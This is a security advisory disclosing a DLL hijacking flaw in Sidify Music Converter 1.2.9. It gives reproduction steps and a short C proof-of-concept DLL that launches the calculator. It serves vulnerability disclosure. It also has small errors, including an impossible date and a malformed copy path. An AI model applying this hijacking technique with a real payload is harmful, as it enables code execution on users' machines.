===================================================== 
[#] Exploit Title : Sidify Music Converter 1.2.9 - DLL Hijacking Code Execution 
[#] Date Discovered : 2018-19-07 
[#] Affected Product(s): Sidify Music Converter v1.2.9 - Software 
[#] Exploitation Technique: Local 
[#] Severity Level: Medium 
[#] Tested OS : Windows 7 & Windows 10
=====================================================



[#] Product & Service Introduction:
===================================
Sidify is a Spotify music converter, encoded with innovative DRM decryption technology, it is able to convert Spotify audio files to a 5X conversion rate 
by keeping the tags after the conversion.
Sidify helps you download and save Spotify music to MP3, AAC, WAV or FLAC, 
so you can play them with your music player more freely. Do you have a lot of songs to convert? 
Do not worry, Sidify lets you drag songs as well as playlist to the program for batch conversion.
 
(Copy of the Vendor Homepage: https://www.sidify.fr/)



[#] Technical Details & Description:
====================================
A local dll injection vulnerability has been discovered in the official Sidify Music Converter 1.2.9 software.
The issue allows local attackers to inject code to vulnerable dynamic link libraries to compromise the process 
or to gain higher system access privileges. Thus allows a local attacker to compromise the system process of the
affected software to followup with manipulations. 


Vulnerable Software:
       [+] Sidify Music Converter

Vulnerable Version(s):
       [+] v1.2.9

Vulnerable Libraries:
       [+] quserex.dll


	   
[#] Proof of Concept (PoC): 
===========================
The dll hijack vulnerability can be exploited by local attackers with restricted system user account and without user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.

Manual steps to reproduce the local vulnerability ...
1. Compile dll
2. Rename the dynamic link library to quserex.dll 
3. Copy quserex.dll to C:\Program Files\Sidify\Sidify Music Converter\Sidify Music Converter.exe
4. Launch Sidify Music Converter.exe
5. Now the calculator executes!


-- PoC Exploit --
#include <windows.h>
#define DLLIMPORT __declspec (dllexport)
 
DLLIMPORT void HrCreateConverter() { evil(); }
 
int evil()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}



[#] Vulnerability Disclosure Timeline: 
======================================
2018-19-07 : Discovery of the Vulnerability
2018-03-08 : Public Disclosure



[#] Disclaimer: 
=============== 
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due 
credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the 
author. The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related
information or exploits by the author or elsewhere.



				    Copyright A(c) 2018 | ZwX - Security Researcher (Software & web application)


